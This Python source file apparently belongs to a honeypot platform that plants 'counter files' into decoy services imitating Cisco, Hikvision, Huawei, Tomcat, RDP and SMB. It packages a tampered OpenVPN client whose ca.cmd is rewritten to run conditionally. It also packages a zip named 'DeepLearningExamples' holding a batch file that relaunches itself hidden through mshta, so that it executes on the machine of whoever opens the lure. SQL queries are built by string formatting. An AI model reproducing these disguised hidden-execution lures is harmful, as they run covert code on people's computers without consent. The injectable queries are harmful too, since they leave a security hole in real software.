import os
import time
import sys,shutil
WORKROOT = "/".join(os.path.realpath(__file__).split("/")[:-3])
sys.path.append(WORKROOT)
sys.path.append(os.path.join(WORKROOT,"web"))
from commonUtil.original_sql import init_sql
from commonUtil.log_func import LOGGER




service_to_path = {
    "ciscoweb_0": {
        "service_name": "ciscoweb_0_centos",
        "path": "/var/log/files"
    },
    "dahua_0": {
        "service_name": "dahua_0_centos",
        "path": "/var/log/files"
    },
    "emailweb_0": {
        "service_name": "emailweb_0_centos",
        "path": "/var/log/files"
    },
    "fakeweb_0": {
        "service_name": "fakeweb_0_centos",
        "path": "/var/log/files"
    },
    "hikvision_0": {
        "service_name": "hikvision_0_centos",
        "path": "/var/log/files"
    },
    "huaweifirewall_0": {
        "service_name": "huaweifirewall_0_alpine",
        "path": "/src/static/counterfiles"
    },
    "huaweiweb_0": {
        "service_name": "huaweiweb_0_centos",
        "path": "/var/log/files"
    },
    "mingyu_0": {
        "service_name": "mingyu_0_alpine",
        "path": "/src/static/counterfiles"
    },
    "nginx_1.17.2": {
        "service_name": "nginx_1.17.2_debian",
        "path": "/var/log/files"
    },
    "h3cweb_0": {
        "service_name": "h3cweb_0_centos",
        "path": "/var/log/files"
    },
    "tomcat_7.0.75": {
        "service_name": "tomcat_7.0.75_debian",
        "path": "/usr/local/tomcat/webapps/backup"
    },
    "vpnweb_0": {
        "service_name": "vpnweb_0_centos",
        "path": "/var/log/files"
    },
    "webcrm_0": {
        "service_name": "webcrm_0_centos",
        "path": "/var/log/files"
    },
    "wikiweb_0": {
        "service_name": "wikiweb_0_centos",
        "path": "/var/log/files"
    },
    "openssh_7.2": {
        "service_name": "openssh_7.2_ubuntu",
        "path": "/opt"
    },
    "rdp_7": {
        "service_name": "rdp_7",
        "path": "C:\\Program Files (x86)\\rdp"
    },
    "telnet_7": {
        "service_name": "telnet_7",
        "path": "C:\\Program Files (x86)\\telnet"
    },
    "smb_7": {
        "service_name": "smb_7",
        "path": "C:\\Program Files (x86)\\smb"
    },
    "epmap_7": {
        "service_name": "epmap_7",
        "path": "C:\\Program Files (x86)\\epmap"
    },
    "rdp_r2": {
        "service_name": "rdp_r2",
        "path": "C:\\Program Files (x86)\\rdp"
    },
    "telnet_r2": {
        "service_name": "telnet_r2",
        "path": "C:\\Program Files (x86)\\telnet"
    },
    "smb_r2": {
        "service_name": "smb_r2",
        "path": "C:\\Program Files (x86)\\smb"
    },
}

def fetch_data(sql:str, all=False):
    db = init_sql()
    cursor = db.cursor()
    try:
        cursor.execute(sql)
        if all:
            data = cursor.fetchall()
        else:
            data = cursor.fetchone()
        return data
    except Exception as e:
        LOGGER.error(sql)
        LOGGER.info(e)
    finally:
        cursor.close()
        db.close()

def query_instances():
    sql = "select services_info.services_name,\
        services_info.services_version,instances_info.instances_id,instances_info.instances_ip \
        from  instances_info left join services_info  on instances_info.service_id = services_info.id where instances_info.instances_status = 1 and instances_info.i_is_trace = 1 ;"
    
    return fetch_data(sql, True)


from module_server.kcontroller.kvm import Kvm

'''
传入参数：
    service：服务名
    version：版本号
    instance_id : docker实例id
    counterFilePath ： 反制文件的路径
'''
def upload_counterFile(service: str, version: str, instance_id: str, instance_ip="",need_check_status = True):

    if need_check_status:
        is_1_sql = "select instances_status from instances_info where instances_id = '{0}'".format(instance_id)
        count = 0
        while count < 60:
            time.sleep(1)
            count += 1
            is_1 = fetch_data(is_1_sql,False)
            if is_1[0] == -2:
                print("服务异常了，不插入反制文件")
                return
            if is_1[0] != 1:
                print("容器还未处于运行的状态。。。")
                continue
            else:
                break
    counterFilePath = "/home/counterFile/OpenVPN.zip"
    config = service_to_path.get(service + "_" + version, "")
    print("config:",config)
    if not config:
        return False
    dest_path = config.get("path")
    if service in ["rdp", "telnet", "smb", "epmap"]:
        vpn_folder = unzip_openVpn(counterFilePath)
        ca_path = os.path.join(vpn_folder,"openvpn_windows_client","ca.cmd")
        with open(ca_path,"r") as f:
            origin_content = f.read()
        with open(ca_path,"w") as f:
            f.write('@echo off \r\ncd /d "%~dp0"\r\ntimeout 2 >nul 2>&1\r\ntasklist | findstr /i "openvpn.exe" \r\nif %errorlevel% equ 0 (echo yes) else ({0})'.format(origin_content))
        counterFileName = counterFilePath.split("/")[-1]
        ca_filename = ca_path.split("/")[-1]
        cmd = 'mkdir "{0}" && move C:\\Windows\\Temp\\{1} "{0}" && move C:\\Windows\\Temp\\{2} C:\\windows'.format(dest_path, counterFileName,ca_filename)
        Kvm.upload_file(instance_ip, counterFilePath, "C:\\Windows\\Temp", 0)  # 上传文件到temp目录
        Kvm.upload_file(instance_ip,ca_path, "C:\\Windows\\Temp", 0)
        time.sleep(1)
        mkdir_bat = "mkdir{0}.bat".format(int(time.time()))
        with open("/tmp/" + mkdir_bat, "w") as f:
            f.write(cmd)
        ret = Kvm.upload_file(instance_ip, "/tmp/" + mkdir_bat, "C:\\Windows\\Temp", 0,
                              command="cd {0} && {1}".format("C:\\Windows\\Temp", mkdir_bat))  # 创建目录并移动文件
        return True if ret.get("code") == 1 else False
    time.sleep(1)
    container_id = os.popen(
        "docker ps|grep " + service + "_" + version + "|grep " + instance_id + "|awk '{print $1}'").read()
    print("chroot /host/ docker ps|grep " + service + "_" + version + "|grep " + instance_id + "|awk '{print $1}'")
    print("container_id:",container_id)
    if not container_id:
        return False
    container_id = container_id.strip("\n")

    print("docker cp {0} {1}:{2}".format(counterFilePath, container_id, dest_path))
    upload_ret = os.popen("docker cp {0} {1}:{2}".format(counterFilePath, container_id, dest_path)).read()
    ideaFilePath = "/home/counterFile/government.zip"
    upload_idea = os.popen("docker cp {0} {1}:{2}".format(ideaFilePath, container_id, dest_path)).read()
    return False if upload_ret and upload_idea else True
    # return False if upload_ret else True

def unzip_openVpn(filepath):
    import zipfile
    zip_file = zipfile.ZipFile(filepath)
    vpn_folder = "/home/counterFile/openVpn"
    if not os.path.exists(vpn_folder):
        os.mkdir(vpn_folder)
    else:
        shutil.rmtree(vpn_folder,ignore_errors=True)# 删除旧的，再建立新的。
        os.mkdir(vpn_folder)
    for names in zip_file.namelist():
        zip_file.extract(names,vpn_folder)
    zip_file.close()
    return vpn_folder

def download_counterFile(url):
    pass


lastMD5 = ""
currentMD5 = ""

def monitor():
    global lastMD5
    global currentMD5
    try:
        ret = os.popen("md5sum /home/counterFile/OpenVPN.zip").read()
    except Exception:
        return
    if ret != "":
        currentMD5 = ret.split(" ")[0]
        # 如果当前的md5与上次的md5不一样，则重新拷贝新的zip文件到容器内部，那么默认每次启动程序都会去复制一遍
        if currentMD5 != lastMD5:
            idea_file_create()
            all_instances = query_instances()
            for instance in all_instances:
                if instance[0] + "_" + instance[1] in service_to_path.keys():
                    upload_counterFile(instance[0],instance[1],instance[2],instance[3],need_check_status=False)

    lastMD5 = currentMD5

def idea_file_create():
    try:
        ret = os.popen("cat /home/counterFile/openvpn_windows_client/ca.cmd").read()
        if ret:
            print(ret)
            base_str = '@echo off\r\nif "%1" == "h" goto begin\r\nmshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit\r\n:begin\r\n'
            last_str = base_str + ret
            with open("/home/counterFile/DeepLearningExamples/texture.bat", "w") as f:
                f.write(last_str)
        ret_zip = os.popen("cd /home/counterFile && zip -r government.zip DeepLearningExamples").read()
        if ret_zip:
            print("idea file create success!")
    except Exception as e:
        print("idea反制文件生成失败:",e)

# if __name__ == "__main__":
#     idea_file_create()